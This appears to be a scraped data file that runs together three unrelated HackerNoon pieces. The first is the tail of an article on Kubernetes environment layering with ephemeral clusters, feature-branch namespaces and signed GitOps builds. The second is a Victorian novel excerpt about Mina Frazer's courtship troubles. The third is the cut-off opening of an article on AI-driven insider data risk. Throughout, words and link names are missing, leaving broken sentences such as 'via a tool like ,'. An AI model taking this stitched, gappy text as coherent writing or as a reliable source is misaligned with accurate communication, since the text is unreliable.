didn’t change</li><li>Test, certify, and </li></ul><h4>Namespace vs. Cluster Isolation</h4><p>This is a decision point that matters significantly, and the wrong choice in either direction is costly:</p><p>| Isolation Level | Pros | Cons |\n|----|----|----|\n| Namespace | Fast provisioning, cheap, reuses cluster infra | Weak isolation, shared control plane, shared CRD registry |\n| Cluster | Strong isolation, independent control plane | Slower to provision, significantly higher cost |</p><p><strong>Namespace-based ephemeral</strong> is appropriate for most feature integration scenarios: stateless services, minor API changes, new endpoints. <strong>Cluster-based ephemeral is required when</strong> changes involve CRD modifications, service mesh upgrades, network policy changes, or control plane component experiments. Applying a CRD change in a namespace-based ephemeral environment will affect every other tenant in the shared cluster — that’s a cluster-scoped operation.</p><p><strong>Why “optional” is the right call</strong>: not every change needs this. A UI copy change or a single-service bugfix doesn’t justify spinning up a cluster. The trigger for ephemeral is  or <strong>cross-team API contract changes</strong> — this should ideally be detectable via API schema diffs in CI and surface a recommendation to the developer.</p><p><strong>Cost governance is non-negotiable</strong>: ephemeral environments need automatic expiry (e.g., 48-hour TTL with optional extension) and cost attribution per team. Without this, they get forgotten and accumulate cloud spend. Implement hard TTLs and surface spend dashboards per team — treat it the same as any other shared resource quota.</p><h3>Layer 3: Dev as an Integration Environment</h3><p>Dev stops being a playground. The rule is simple: <strong>only signed-off, CI-validated builds get deployed to dev</strong>. This single constraint changes the entire culture around the environment.</p><p>“Signed” here is not conceptual — it means OCI artifact signing via a tool like , integrated into CI, producing a verifiable signature that the artifact has passed all required gates. The GitOps controller (Argo CD or Flux) only reconciles images that carry a valid signature. Unsigned images are rejected at deployment time, not discovered after the fact.</p><p>The control plane team owns the <strong>deployment schedule for dev</strong> — defining when the integration environment is refreshed and which golden builds are “current.” Product teams promote their signed builds via a PR to the environment repository; the GitOps controller picks up the change and reconciles. This keeps Git as the single source of truth for what is deployed where.</p><p><strong>Observability is not optional here.</strong> Dev needs structured, correlatable telemetry — distributed traces, structured logs, and metrics — to diagnose integration failures. Specifically: correlation IDs must propagate across service boundaries, a minimal OTEL collector must be wired up and auto-configured, and trace data must be queryable without needing to SSH into a pod. A broken integration in dev without traces is just guessing with extra steps.</p><h3>Layer 4: Feature Branch Environments (Lightweight Isolation within Dev)</h3><p>This is the most operationally nuanced piece. For minor, non-breaking changes, developers need a way to test integration without either (a) polluting the main dev namespace or (b) the overhead of a full ephemeral cluster.</p><p>The solution: <strong>namespace-per-feature-branch within the dev cluster</strong>, with traffic isolation.</p><p>:</p><ul><li>Feature branch push triggers namespace creation in dev</li><li>Only the services the developer  are deployed from the feature branch; everything else is proxied to the main namespace or deployed from main’s golden builds</li><li>Traffic routing is header-based (e.g., <code>X-Feature-Branch: feat/ui-fix</code>) or via virtual services in a service mesh</li><li><strong>Merge to main → CI job deletes the feature namespace automatically</strong></li></ul><p><strong>Hard problems that need explicit design decisions:</strong></p><p><strong>1. Header-based routing only works for HTTP.</strong> This is an important constraint. Header injection works well for synchronous HTTP/gRPC services where you control the client. It does not work for Kafka consumers, CronJobs, background workers, or any async workload. For event-driven services, you need topic-per-feature-branch or a separate consumer group strategy. Define the isolation model per workload type, not one-size-fits-all.</p><p><strong>2. Shared stateful services.</strong> Feature namespaces cannot share a database with main without risking data corruption. Schema-per-feature (Postgres) is a common approach, but it only provides partial isolation — PostgreSQL extensions, global roles, and large migrations are cluster-scoped and can still cause cross-feature contamination. Schema isolation reduces risk; it does not eliminate it. For full isolation of stateful concerns, prefer mocking or a dedicated lightweight database instance per namespace.</p><p><strong>3. Service discovery across namespaces.</strong> When a feature-branch UI calls Auth, should it call the feature-branch Auth (if one exists) or fall back to main? This fallback routing logic needs to be explicitly defined — naive approaches cause subtle cross-namespace contamination that is extremely hard to debug.</p><p> This is the subtlest and most disruptive problem in multi-team Kubernetes. CRDs are cluster-scoped resources. If the control plane team upgrades a CRD while feature namespaces are running against an older version of that CRD, those namespaces can break silently or catastrophically. Any CRD change must be backward-compatible, and the upgrade must be coordinated across all active feature namespaces. This is one of the strongest arguments for preferring cluster-based ephemeral environments for control plane changes.</p><p><strong>5. Certificate and identity propagation.</strong> mTLS and service identity in a service mesh get complicated when services span namespaces. The control plane team needs to provide an explicit model for how SPIFFE identities are scoped and how cross-namespace trust is granted.</p><h3>Layer 5: Stage and Production</h3><p>Stage should mirror production topology and configuration semantics, even if scaled proportionally. In practice, full resource parity is rarely achievable — teams typically run stage at 30-50% of production capacity. That’s acceptable as long as the  (same number of service replicas relative to each other, same network policy structure, same service mesh configuration) is preserved. What kills you is configuration divergence, not resource size.</p><p>This is also where load testing, chaos engineering, and security scanning should live — not in dev, where you can’t trust the build quality, and not in prod, where the blast radius is real.</p><h2>A Concrete Scenario End-to-End</h2><p>Abstract patterns are useful; a concrete walk-through is more useful. Here’s what this model looks like when it works:</p><p>: Team A owns the Auth service and is changing the token response shape — a backward-incompatible API change that affects the UI team (Team B) and the API gateway (owned by the control plane team).</p><ol><li><strong>CI detects the breaking change</strong> via API schema diff on pull request open. It flags the change as requiring ephemeral validation and blocks promotion to dev.</li><li><strong>Team A provisions a cluster-based ephemeral environment</strong> (cluster-based because they’re modifying a CRD used by the auth operator).</li><li>They pull golden builds of the UI (v2.3.1) and the API gateway (v1.8.0) from the registry. They deploy their Auth feature branch alongside these.</li><li>Integration tests run. They discover the UI breaks on the new token shape — caught here, not in dev.</li><li>Team A coordinates with Team B. Team B cuts a feature branch (<code>feat/ui-auth-token-compat</code>) and adds it to the ephemeral env alongside the Auth change.</li><li>Both changes validate together. Tests pass. Team A certifies the environment and triggers teardown.</li><li>Both teams promote their signed builds. The GitOps controller reconciles dev. Dev integration tests pass.</li><li>Normal promotion to stage and prod follows.</li></ol><p>Total blast radius: one ephemeral cluster, two teams, zero disruption to dev.</p><p>A critical clarification: the control plane team’s role shifts significantly in this model. They are not just operating infrastructure — they are building an <strong>internal developer platform (IDP)</strong>. That’s a product, and it needs to be staffed and resourced as one.</p><ul><li>Golden build registry and promotion governance</li><li>Namespace provisioning automation (feature namespaces spun up/torn down via CI)</li><li>GitOps controllers (Argo CD / Flux configuration and access control)</li><li>Observability baseline (OTEL collector, trace backends, dashboards)</li><li>Cluster lifecycle and CRD versioning strategy</li><li>Resource quotas and TTL enforcement for ephemeral environments</li></ul><ul><li>Service code and build pipelines</li><li>Consumer-driven contract tests against services they depend on</li><li>Feature namespace usage and cleanup</li><li>Promotion decisions for their own builds</li></ul><p>Without this explicit ownership split, the platform collapses into the classic “ops does everything, product teams do whatever they want” failure mode.</p><p>These are the failure modes this model is designed to prevent. If you see them happening, the process is being bypassed:</p><ul><li><strong>Dev as shared scratch pad.</strong> The moment someone manually deploys an unsigned build to dev, the integration baseline is contaminated. Enforce signing at the GitOps controller layer, not on trust.</li><li><strong>Feature namespaces without quotas or TTLs.</strong> They will accumulate. Set hard limits and automate cleanup.</li><li><strong>Ephemeral environments without TTLs.</strong> Same problem, higher cost per unit. Always set a maximum lifetime with an explicit extension process.</li><li><strong>Golden builds without a promotion owner.</strong> If “golden” means “latest passing CI build,” it’s not golden — it’s just another label on an untested artifact. Someone must own and approve promotion.</li><li><strong>Manual deploys to dev or stage.</strong> If it bypasses GitOps, it bypasses the audit trail, the signature check, and the environment state guarantee. Block it at the RBAC layer.</li><li><strong>Shared stateful services across feature namespaces.</strong> This will cause non-deterministic test failures that are nearly impossible to attribute. Always isolate state per namespace.</li><li><strong>CRD upgrades without coordination.</strong> A CRD upgrade in a shared cluster is a breaking change for every active feature namespace. Treat it as such.</li></ul><p>Even with all of the above, a few gaps remain worth addressing explicitly:</p><p><strong>Rollback and incident response path.</strong> The flow described is a forward-delivery path. The reverse — rollback from prod, and the incident investigation path (which environment do I use to reproduce this?) — needs a separate, equally explicit playbook. Engineers under pressure will do the wrong thing (reproduce a prod incident in stage, contaminating it) if there’s no clear procedure.</p><p><strong>Environment parity and configuration management.</strong> Dev, stage, and prod will drift in configuration over time. A deliberate secrets and config management strategy — external secrets operator, Vault, or environment-specific Kustomize overlays — needs to be in place from day one. Config differences between environments are a leading cause of “works in dev, breaks in stage.”</p><p><strong>Contract testing as a first-class gate.</strong> Consumer-driven contract tests (e.g., Pact) between teams, run in CI on every pull request, catch breaking changes before they reach any environment. This complements the ephemeral environment — contract tests validate at test time; the ephemeral environment validates at runtime. Both are necessary.</p><p>| Layer | Purpose | Entry Criteria | Exit Criteria |\n|----|----|----|----|\n| Local | Develop &amp; unit validate | Always | Builds and passes local tests |\n| Ephemeral | Validate breaking/cross-team changes | Breaking change or CRD modification detected | Integration tests pass; cert issued; destroy |\n| Dev Feature NS | Lightweight multi-service branch testing | Minor change, needs HTTP integration testing | Merged to main; NS auto-destroyed |\n| Dev Integration | Continuous integration baseline | Signed artifact (Cosign), contract tests pass | All integration tests green |\n| Stage | Production validation | Dev integration green | Load tests pass; manual sign-off |\n| Prod | Serve users | Stage approved | N/A |</p><p>The core philosophy: <strong>every environment has one job</strong>. The moment an environment is asked to do two jobs simultaneously — scratch pad  integration baseline — it fails at both.</p><p>Done right, this moves your engineering culture from “who broke dev?” to “I certified this before it got to dev.” The hardest part isn’t the tooling — it’s the discipline. Tooling can enforce gates, but teams need to genuinely treat each layer as what it is, not as a convenient shortcut to the next one.</p><p><em>This architecture is most effective when the platform team treats their output as a product — not as infrastructure support. The golden build registry, the namespace provisioning automation, the GitOps controllers, the observability baseline: these are features, with roadmaps, with SLOs, and with users.</em></p>",

and when he mysteriously hinted how, in a little time, he would “get round” Uncle John and coax him into doing a little more for him yet, the worthy lady’s patience became exhausted, and she confidentially told Mina she thought her brother was “a ridiculous idiot.”</p><p>They disagreed, whenever they met, on every conceivable point,—religion, politics, the news of the day, dress, education, music, books, amusements: these topics furnished them incessantly with occasions for what Malcolm styled, “little tiffs;” and he so enjoyed putting the worthy governess out of temper, that he frequently said precisely the opposite of what he thought, that Miss Caldera might be thus, innocently trapped into an argument, which furnished him with opportunities for laughing at her.</p><p>The theme matrimonial was, however, the grand battle-ground on which the two delighted to fling decided opinions at each other’s heads; for Miss Caldera,&nbsp;244with all her sense, was one of those people who appear to imagine the feminine portion of the creation have been sent on the earth for no other purpose save to marry: and, to superficial observers, it really seemed as if she had remained a spinster solely from a philanthropic desire to have more time at her disposal to assist her fellow mortals to fulfil their destinies in this particular.</p><p>Original sense and later experiences were perpetually battling together in her mind, and she strove so hard to persuade herself and all whom it might concern that a “good settlement” was the great prize on which, from infancy, a female ought to fix her eyes, that she talked her theoretical set of opinions at every mortal who dared her to contradiction, with a pertinacity which ought, at least, to have convinced her own mind of the truth of her perpetual assertion, “That the only thing a woman can and ought to do to help herself, is to marry.”</p><p>But in vain: a few obstinate and primitive ideas, which she had collected amidst the roses of her mother’s flower-garden and the Latin books of her father’s library, that woman may think of something else during her progress through this world than “catching” a husband, would keep springing up in her rebellious heart; and, though she strove hard&nbsp;245to root up these absurdities, all her endeavours were but of very little use, for the new views which intercourse with the world had taught her did not satisfy her as to the “rightness” of the match-making system, though they did as to its utility; and, when she got fairly bewildered, between feeling and what she was pleased to term reason, she settled the point by repeating, for the thousandth time, there was something wrong about women’s position, but as they were so situated, the best thing they could do, individually and collectively, was to marry, though she could not avoid confessing to herself that it was a great pity the eternal necessity should be always driving mothers and daughters along in an everlasting search after elder sons and wealthy partners.</p><p>Some specimens of the “fine old English gentleman” are still to be met with in rural districts, who assert that fox-hunting is the noblest pursuit which can employ the faculties of man; and really to have heard Miss Caldera converse, it might occasionally have been imagined she thought husband-hunting the grandest chase that could by possibility occupy the mind of woman, and her knowledge of the difficulties and troubles besetting every step of a female’s life had made her think it, as she said, “a very necessary chase,” though, to do her justice, she&nbsp;246never could so far get over some of her original ideas as to feel that a marriage without affection is preferable to labouring solitarily for daily bread, or that any amount of hundreds or thousands per annum could have induced her, even though so weary of her situation, to take, for better, for worse, one whom she could not respect and love.</p><p>The perpetual warfare which went on in her mind, between feeling and desirability, produced many rather contradictory results; amongst others, the anomaly that she, a spinster governess, who was constantly urging on all with whom she came in contact to “fulfil their destinies,” had refused, since she came to London, what her cousin, the schoolmistress, had been pleased to term, a most “eligible offer,” from a rich, vulgar, dinner-loving&nbsp;&nbsp;(who wanted a wife as a housekeeper, and thought Miss Caldera would just suit), simply because she retained an old-fashioned prejudice (spite of her new-fashioned convictions) that she should not care to wed a person she disliked: and no doubt she was very foolish to reject a home for such a slight reason. And she thought so herself; but she could not overcome the prejudice, and so remained single to give capital advice to other people, which she did not approve sufficiently to follow herself.</p><p>247Then again, until any girl amongst her limited circle of acquaintances was “settled,” she gave her rest neither by day nor night till she tacked “Mrs.” to a new name; told her, if she chanced to be so self-willed and unworldly as to refuse an apparently eligible offer, that “she had thrown good fortune from her,” and “wished she might ever get such a proposal again;” and finally, after she had, in conjunction with friends and relatives, moved heaven and earth to get her to tie herself for life to some rich dunce or genteel spendthrift, she turned the tables, and commenced grumbling “how that misguided child had thrown herself away, and what a wretched lot she had thought proper to select for herself.”</p><p>Many reasons induced her to desire that Mina should marry Mr. Westwood: first, she liked him, and thought there was no cause to fear its proving an unhappy union; secondly, that gentleman had been at great pains to convince her that Mina’s chance of fortune from her uncle was by no means certain; that he might choose a wife for himself; that he might quarrel with Malcolm, who was a most provoking young fellow; that he might even fail; that a thousand reverses might arise to blast her prospects; that, in fact, her only hope of a tranquil&nbsp;248existence was changing her Scotch name for his English one; and his hints to Miss Caldera had grown so alarmingly strong after Malcolm’s finishing exploit, that at length the worthy governess became a sight perfectly dreaded by Mina, who was half frightened by the pictures of poverty occasionally presented for her contemplation, but who was wholly determined to have her own way, spite of the combined efforts of the entire universe, always supposing she could manage to get it.</p><p>On the Sunday previous to the dialogue between Malcolm and his sister, it had chanced that Mr. Alfred Westwood, instead of walking peaceably home from church to his house in Belerma Square, turned his steps in an opposite direction, and proceeded to that tenanted by Miss Caldera and her cousin, both of whom he encountered on the pipeclayed steps.</p><p>“Could you favour me with five minutes’ private conversation,” he said, on the strength of which point blank hint, the strong minded schoolmistress, who had somehow come to the conclusion that the earth would be too happy if fine gentlemen and bold children were not permitted to spoil the face of it, stalked majestically off, setting down vanity, perfumes, rings, hair oil, and rudeness, as amongst the&nbsp;249sins which did most easily beset Mr. Alfred Westwood, and had gained immense possession over him.</p><p>“Miss Caldera,” began that individual, who could speak perfectly straightforwardly when he chose to do so, “will you try to bring Mina to reason. I want to marry her, and settle the business without delay.”</p><p>“You ought to try yourself,” replied the lady, who was pretty nearly weary of her fruitless endeavours.</p><p>“I have, till I am tired,” he answered; “but I have now more pressing reasons than ever: if you will use your best influence, you shall never have cause to repent; if she marry me I will make her happy—on my soul I will; her uncle’s consent is certain, will you try to gain her’s?”</p><p>“She does not seem to care very much for you; that is the difficult part of the business,” said Miss Caldera.</p><p>“But it is her&nbsp;&nbsp;to care for me,” retorted Mr. Westwood, “and if you point that out to her, the rest is easy; no woman is insensible to that.”</p><p>The&nbsp;&nbsp;brought a flush into the lady’s pale cheek as she answered warmly,</p><p>“Interest is the&nbsp;&nbsp;thing woman does look to in any relation of life, and no mortal ever thought less&nbsp;250of worldly advancement than Mina Frazer; faults she has,—too many, perhaps, for her own happiness,—but a mercenary spirit is not one of them; I could not care for her as I do if she were sordid and calculating; neither could you.”</p><p>Mr. Westwood smiled as he replied,</p><p>“Perhaps not,” but it was not a pleasant smile; in truth, he had about as much opinion of women as of men, and that was none: but he had a strange sort of attachment for Mina; a dim unacknowledged idea that there was some kind of good in her, although at the same time he thought she refused him, not because she was blind to his fascinations—that being impossible—but because she expected to be a great heiress, and to marry, perhaps, in time, a pauper lord. He saw the pride and folly of both mother and son, and concluded that underneath Mina’s reserve, pride as great, and folly nearly as ridiculous, were resolutely lurking; therefore, he imagined if she thought herself likely to be poor, she would accept him, and that was all he wanted her to do; he would manage all the rest quietly and dexterously himself. In this endeavour, who so likely to aid him as Miss Caldera, his staunch friend and ally? wherefore he had come to her, and so, instead of treating her to his opinion of the entire&nbsp;251feminine sex, he said, in answer to her rather angry speech, the two words previously recorded,</p><p>“I am sure not,” responded the governess earnestly.</p><p>“I wish,” he said, “you would find some means to make her care for me; believe me she had better.”</p><p>There was a significance in the tone of the latter portion of the sentence that struck Miss Caldera so much as to cause her to inquire what he meant.</p><p>“That it will be well with mother, brother, and sister if she do; that it will be worse for all if she do not,” was the rejoinder.</p><p>“You do not wish me to understand that, even if Mina persist in her refusal, you would be so ungenerous as to endeavour to turn Mr. Merapie’s heart against them,” she said, hurriedly.</p><p>“Heaven forbid!” replied Mr. Westwood; “but in the one case I should use all my influence to advance their interests, and in the other I should merely let matters take their course, without interfering. I don’t pretend to Quixotism, Miss Caldera: if she marry me, I will do her and her’s good;&nbsp;252if not, I would not stir ten paces out of my way to serve her; she had better consider fifty times before she says ‘no.’”</p><p>“But do you mean to imply that Mr. Merapie takes Malcolm’s breach of discipline in such an angry spirit that he will never forgive it,—that the silly boy has endangered, not merely his own prospects but those of his sister?” she inquired in surprise. “I think you must be mistaken. I can scarcely believe that he will ever forget to provide for Mina, at all events.”</p><p>“I neither imply nor ask you to believe anything,” said Mr. Westwood deliberately; “but I say what I&nbsp;, that he is greatly grieved about his nephew, and perplexed and tormented about other matters; that Mina Frazer’s fortune won’t be the one half what I once thought it would be, and what she, I suppose, thinks it is certain to be; and, finally, I know she had better marry me, and I want you to try and persuade her to do it: if she does not have her fortune settled now, she may never have any.”</p><p>There was a something almost triumphant in the tone in which these words were spoken, and Miss Caldera felt a vague alarm steal over her as she asked,</p><p>“But why do you say so;&nbsp;&nbsp;is she less likely&nbsp;253to be wealthy a few years hence than now? Why are you in such haste to have matters arranged?”</p><p>“Because life is always uncertain, and business is even more so; because, in ten words, ‘it is well to strike while the iron is hot,’” was his brief reply.</p><p>Miss Caldera sat and looked at him as if she thought more knowledge might be gained from any feature in his face than from his mouth; but he returned her gaze with such an unmoved expression of countenance, that at last she withdrew her eyes with a vexed and puzzled air: then he, with a smile, arose to depart.</p><p>“I am not jesting,” he remarked, by way of a departing hint.</p><p>“I see you are not,” she answered.</p><p>“And I trust to your friendship and good sense,” he added.</p><p>“I suppose,” began Miss Caldera, “it would be useless to ask you any questions on the subject, for——”</p><p>“For, although it is impolite not to answer any questions a lady may propound, you think, in this instance, I should feel inclined to do so,” he interposed, resuming his usual manner, and laughing so as to display the whiteness of his regular teeth. “No, no, please not to place me in such a disagreeable&nbsp;254position, because I cannot tell even you; and indeed I should not like to refuse. I have said, perhaps, even more than I ought, but I rely implicitly on your discretion.”</p><p>And Mr. Westwood, who was evidently most anxious to get out of the house, shook hands quite vehemently with the governess and departed, leaving her, for the first time since she had seen his clever handsome face, a little dissatisfied with the possessor of it.</p><p>For a few minutes she actually wondered if Mina were not right, if a marriage between the shrewd, calculating, middle-aged man and the impetuous, generous, passionate, self-willed girl, were likely to produce happiness; and then Miss Caldera “pshawed” down the thought, and decided that, if there were the least risk of Mina ever being poor, she ought to wed Mr. Westwood at once, who was just as good as most men, and far better than many.</p><p>All that night Miss Caldera strove to convince herself Mr. Westwood had been merely threatening or scheming; but there was truth in the tone of his voice as it sounded again and again in her ears. She began to form a fixed idea that something was wrong, and, on the full strength of this conviction, she went over to Belerma Square the following&nbsp;255afternoon, and had a long earnest talk with Mina, the result of which talk was, that her former charge got, as usual, into a passion, and, going a step further than was her wont, declared that “she would submit to this persecution no longer; that marry Mr. Westwood she would not; that she had no present intention of wedding any one; and that, finally, she was mistress of her own actions and intended to remain so, and that she wished Miss Caldera would not interfere with her again.”</p><p>Then the governess, who, though sensitive to a look from most people, knew Mina’s love for her so well as never to feel offended even at her angriest expressions, put her arms around the girl’s waist, and, even though Mina strove to push her away, besought her, for the sake of former times, to, listen to her. And then she told her old pupil all that Mina subsequently repeated to her brother, and a great deal more besides—which brought tears into the rebellious eyes and a swelling into the wilful heart—about how earnestly she desired her happiness, and of what an interest she had taken in her from the first day, and how she had loved the pale slight child at the beginning, solely because of the vehement love she had evinced for the land of her birth and the people who dwelt there.</p><p>256“You may be angry or not, Mina,” the faithful friend said at length, “but so long as I speak to you, I will say just what I think; for many reasons, I believe you are wrong to be so stiff towards Mr. Westwood, who is so fond of you. Mina, for my sake, will you reflect on all I have said?”</p><p>“Good gracious!” said the girl, squeezing back, after her determined fashion, a tear that almost trembled on her eyelashes, “good gracious! you have made me think about Mr. Westwood and ‘marrying and giving in marriage’ till I am sick of the theme, and the conclusion I long ago arrived at, Malcolm, you remember, put into words for me the other day. He said, men considered matrimony, when they reflected upon it at all, as a thing which might come, not as women did, as a thing which must come; that it is one incident in the drama of men’s lives, but forms the entire plot in the drama of ours; that, if you would let me think of it as of an event which, if it suited, was well, and if it did not, why well still,—it would be better and happier and more respectable altogether. He says, that’s the way he contemplates the step matrimonial, and that he does not see why, simply because I am his sister, I should not view it in the same light.”</p><p>“Malcolm can push his way in the world, if he&nbsp;257will; he must never be a dependant amongst strangers: he is a man and may struggle; you could not.”</p><p>“I could,” retorted Mina, “but I need not, for my uncle will always provide for me.”</p><p>“Mina Frazer,” said Miss Caldera, laying an earnest hand on her shoulder and looking half sorrowfully into the flushed youthful face, “do not be too sure of that; life’s chances and changes are awful to contemplate. I once would have laughed, had any one told me I should ever have to work for my daily bread; but desolation came into my home. You have not the patience or the nature to bear, as it has been my lot imperfectly to do; you would not like to think you would ever be situated as I am; but remember, dear, when reverses come, that, though a woman tenderly trained and matured finds it hard to toil and work, yet that still she must live. I had a father to leave a competence to his only daughter, and yet you know a little of the burden I have borne.”</p><p>“I am as sure,” said Mina, gazing up sadly into the countenance of the weary woman, “I am as sure of Uncle John as I could be of my dear father if he were now alive.”</p><p>“And still, dear Mina, his love was impotent to&nbsp;258preserve you from beggary; strong it was, I doubt not, but it had not power to keep him alive to guide and love and struggle for you.”</p><p>There was a pause, and then Mina said in a subdued voice,</p><p>“I wish I could do any one thing to show how I love you, except marry that horrid man, indeed I would do it.”</p><p>“Will you be a little more polite to him then, Mina, and endeavour to get Malcolm to be so too?” implored Miss Caldera.</p><p>“I will, just to please you,” said the girl; “for you’re a dear, kind, steady, provoking old friend, whom I shall never quarrel with for more than an hour at a time so long as I live, never!” And as Mrs. Frazer entered the room at this moment, Mina left it a little sorrowfully and a great deal more thoughtfully than usual.</p><p>Indeed she reflected so much on the subject that she resolved to warn her brother at the very first opportunity, and, as we have seen, did warn him; but her words, instead of soothing that young gentleman, only moved his spirit unto irritation, all the greater, perhaps, because he felt them to be true; and he resolved, during the course of his walk, that, instead of speaking to his uncle, as he had intended,&nbsp;259immediately on Mr. Merapie’s return from Holland, he would go to Scotland until, as he mentally expressed it, “the storm blew over,” and take Mina with him.</p><p>“Then,” he concluded, as he paced home through Arras Street, in the fading light of a January afternoon, “he will have forgotten all about my unlucky exploit, and I will promise to be his dutiful nephew, and turn out a pattern of obedience and grace and so forth, and he will buy me a commission; and, if Westwood be not ‘settled’ some way by that time, why of course, when I am more in favour, I can speak with a better chance of success than would be possible at present: that is just what I will do forthwith,—write to Craigmaver and tell Allan and the laird what I want.”</p><p>And, having sketched out this vague beautiful design, Malcolm Frazer raised his eyes from the slippery pavement and noticed casually, as people do notice such things in London, that a tall gentlemanly looking man was walking slowly and thoughtfully a few steps before him.</p><p>“Decidedly an aristocrat,” was the result of Malcolm’s brief survey, for he had imbibed from his mother, the city merchant’s daughter, an idea that fine figures and long pedigrees are inseparable; and&nbsp;260having arrived at this conclusion, the young Scotchman, who had a love for Aristocrats, second perhaps only to his love for himself, continued to scrutinize the stranger with some interest.</p><p>That individual was so much engrossed with his own reflections, that he never noticed one of those slides which, spite of the police, mischievous boys will make for their amusement in quiet streets, and, walking unsuspectingly upon it, down he came; before he was aware he had slipped, he was lying full length on the pavement at Malcolm’s feet.</p><p>“Halloa!” cried out that young gentleman in true sailor fashion, and “Halloa!” echoed a cabman, who was slowly coming down the narrow street, and who pulled up and jumped off his box to the rescue.</p><p>“Knowed he was ill hurt,” said he to Malcolm, “by the way I saw his head coming against the ground.”</p><p>“A deuced ugly business,” remarked Malcolm; “his head is cut, and, it seems to me, his arm broken.”</p><p>“Is he a friend of your’s, sir?” inquired a person who now joined the group to render assistance, as the Londoners always do on such occasions with&nbsp;261hearty good will; “the fall has completely stunned him: is he a friend of your’s?”</p><p>“Never saw him in my life before,” was the rejoinder.</p><p>“Better put him in the cab, then, and drive without delay to the nearest hospital,” suggested a clergyman, standing amidst a knot of passers by and idlers, who had by this time collected to enjoy the excitement.</p><p>“Better look in his pocket for an address and take him there,” growled out a policeman, coming forward, as if to aid in the search.</p><p>“No, no!” cried a doctor; “the hospital’s close at hand, drive him there.”</p><p>“Shall I, sir?” demanded the cabman of Malcolm, to whom he somehow looked for his fare.</p><p>“No,” said the latter angrily; “stand back,” he continued, addressing the crowd generally, and the policeman particularly: “I am a gentleman myself, and I won’t submit to see a gentleman’s pockets rummaged or himself dragged off to an hospital. I’ll take the charge of him on myself: help me to lift him into the cab, driver; so,—now walk your horse very slowly over to number 12, Belerma Square;” and, as he spoke, Malcolm Frazer, who, spite of his absurd speech, would have done the same good turn&nbsp;262for the meanest gillie that ever crossed a Highland moor, and who was possessed of an honest manly heart, and any amount of sailor frankness, entered the vehicle and strove with tenderness and solicitude, such as a woman might have displayed, to prevent the jolting injuring the sufferer, who, at the moment, however, was insensible to everything.</p><p>“Now you just be off about your business,” said the policeman savagely to a lot of boys who remained looking after the cab with open mouths, “be off about your business, if you have any, and if you haven’t, you had best make it one to be moving, or I may make it mine to stir you,” which vague threat produced so speedily the desired effect, that in five minutes he found himself pacing along the street utterly alone in his glory.</p><p>Mina was standing at one of the drawing-room windows as the cab stopped before the door of number 12; and, when she beheld her brother assisting the driver to lift something wonderfully resembling a human being out of the vehicle, and up the half dozen stone steps, she, moved by that curiosity which her mother Eve had transmitted to her, and also by that pity which every woman feels for the suffering and the afflicted, hastily quitted her post of observation, and ran down into the hall to ascertain&nbsp;263what this new arrival meant, and if anything dreadful had occurred.</p><p>“Malcolm, what&nbsp;&nbsp;the matter?” she inquired.</p><p>“Don’t torment me, Mina,” rejoined Malcolm, who, on the strength of being desperately out of breath, and in a profuse perspiration from his late philanthropic labours, felt himself raised on a sort of moral eminence above his sister. “Don’t torment me, Mina, but open that door, and send one of the servants over for Dr. Richards, and don’t talk, but come and make yourself useful if you can.”</p><p>And thus fraternally exhorted, Mina—whilst her brother paid the cabman so liberally, as not merely to extort three touches of the hat and two “thank you, sirs” from that individual, but also to cause him to mutter, as he drove off, in confidence to his horse, that he was a gentleman and no mistake, though he lived in such a place—did make herself useful; and truly there was need that she should, since Mrs. Frazer could not bear the sight of a wound, and the housekeeper was, if possible, worse than her mistress, and her assistant was out in quest of a doctor, and Miss Caldera was giving a French lesson some two miles off: there was need that she should.</p><p>“Bad case,” said the doctor when he entered.</p><p>264“Not hopeless, though,” exclaimed Malcolm.</p><p>“Well, no; but he must not be moved again: pity you had not carried him upstairs at once.”</p><p>“There is no necessity,” interposed Mina; “a bed can be made up here.”</p><p>“Let it be done then,” said Dr. Richards, one of the briefest and gruffest of his profession; but as Mina left the room to obey his command, he added, nodding approvingly to Malcolm, “always knew she was none of the fainting sort.”</p><p>And Mina got matters arranged so speedily and satisfactorily, that even the acid man of medicine was moved unto complimenting her; and he turned every mortal out of the room save Malcolm and herself, and made her hold a candle for him whilst he bandaged, and set, and went so rapidly and (Mina thought) so roughly through all sorts of surgical processes, that the girl at last grew quite faint and sick, and would fain have abandoned her post; but the doctor and Malcolm both telling her, though in somewhat various modes, that as she had been sent on the earth she must make herself useful there, she remained at their bidding to do all she could for the sufferer, who, when he was at all restored to consciousness, first groaned in perfect agony, and then inquired,</p><p>“My dear sir,” growled forth Dr. Richards, “will you keep yourself quiet, if you please, and not speak a single word;” an injunction the patient obeyed whilst the pain of his arm kept him mute; but during a moment of ease, he whispered to Mina, who was bathing his forehead with some mixture the doctor had given her,</p><p>“Do tell me what place this is?”</p><p>“My uncle’s,” said the girl, in a voice which convinced him, more than fifty assurances could have done, that he was amongst those who are to be found in all climes and countries and ranks and classes; amongst those who enhance the pleasure of life, and soften its bitterness; amongst those of whom we meet a few everywhere, and part from mournfully, and greet joyfully, and call with thankful trusting hearts—friends.</p><p>:::info\n<em>About&nbsp;HackerNoon Book Series: We bring you the most important technical, scientific, and insightful public domain books.</em></p>",

      "content": "<p>Before the acceleration of AI, insider risk always centered on human intent. Security teams monitored high-risk employees who were prone to downloading files before leaving the company, or negligent employees who engaged in thoughtless behavior (e.g., clicking a phishing link.) In other words, the insider risk threat model was based on people doing things they shouldn't.</p><p>AI has fundamentally changed this paradigm. The risk is no longer limited to ill-intentioned employees but also to those who wish to make their work easier. By using widely available AI tools and platforms for work, they may inadvertently share sensitive data outside their secure business environment.&nbsp;</p><p>The data on heightened insider risks tracks. Based on Proofpoint’s , “Two-thirds of CISOs experienced material data loss in the past year, with insider-driven incidents topping the list of causes.”</p><p>Data movement has also dramatically changed. Instead of moving vertically through standard approval channels, data now moves horizontally across teams, tools, and AI assistants. In turn, security leaders are struggling to gain visibility into their activity. Data from Proofpoint shows that  in the U.S. are concerned about customer data leaking through public generative AI platforms.</p><p>A user may ask an AI assistant a simple question. The model will subsequently gather data from internal systems (e.g., CRM, ERP) and multiple external sources (e.g., websites, social media), then forward the combined results to all members of the user's collaboration platform (Slack).</p><h2>AI as a Data Movement Layer</h2><p>AI fundamentally altered the data lifecycle inside organizations. Traditionally, there were clear handoffs, where an employee downloaded a file, edited it, and sent it to a coworker. Security teams could track each step of the process.</p><p>AI workflows are not the same. A worker asks a question. The AI assistant pulls information from many sources to answer the question. It condenses documents, changes the data format, and produces an output that can be shared on collaboration platforms. Each step happens in seconds with very little human oversight.</p><p>“As organizations adopt autonomous agents that can browse, write code, and act across multiple systems, autonomy becomes a major risk multiplier,” says Proofpoint professionals in a .&nbsp;</p><p>This 